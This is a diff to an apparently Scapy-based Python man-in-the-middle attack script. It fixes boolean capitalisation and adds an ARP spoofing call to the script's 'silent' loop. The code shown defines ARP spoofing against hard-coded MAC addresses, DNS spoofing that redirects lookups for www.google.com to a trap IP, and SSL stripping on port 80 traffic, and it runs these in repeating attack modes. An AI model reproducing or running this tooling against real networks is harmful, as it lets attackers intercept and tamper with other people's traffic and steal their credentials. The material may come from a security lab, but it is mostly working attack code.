@@ -9,7 +9,7 @@ trapUrl = "www.google.com."
 ipTrap = "142.251.32.100"
 ip6Mal = ""
 
-def ARP_spoofing(verbose=false):
+def ARP_spoofing(verbose=False):
     macM1 = "08:00:27:b7:c4:af"
     macM2 = "08:00:27:CC:28:6f"
     macM3 = "08:00:27:d0:25:4b"
@@ -31,7 +31,7 @@ def ARP_spoofing(verbose=false):
     sendp(arp_M2, iface = "enp0s3")
 
 # DNS-Spoof Attack
-def dns_spoof_attack(verbose=false):
+def dns_spoof_attack(verbose=False):
     packets = sniff(filter='udp port 53', count=8, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
@@ -95,7 +95,7 @@ def ssl_strip(packet):
 
             send(packet, verbose=0)
 
-def ssl_strip_attack(verbose=false):
+def ssl_strip_attack(verbose=False):
     # prn = function to apply to each sniffed packet
     sniff(filter="tcp and port 80", prn=ssl_strip)
 	
@@ -105,6 +105,7 @@ def ssl_strip_attack(verbose=false):
 def silent_mode():
     try:
         while True:
+            ARP_spoofing()
             dns_spoof_attack()
             time.sleep(20)
     except KeyboardInterrupt:
@@ -113,8 +114,8 @@ def silent_mode():
 def all_out_mode():
     try:
         while True:
-            ARP_spoofing(verbose=true)
-            dns_spoof_attack(verbose=true)
+            ARP_spoofing(verbose=True)
+            dns_spoof_attack(verbose=True)
             time.sleep(20)
     except KeyboardInterrupt:
         pass
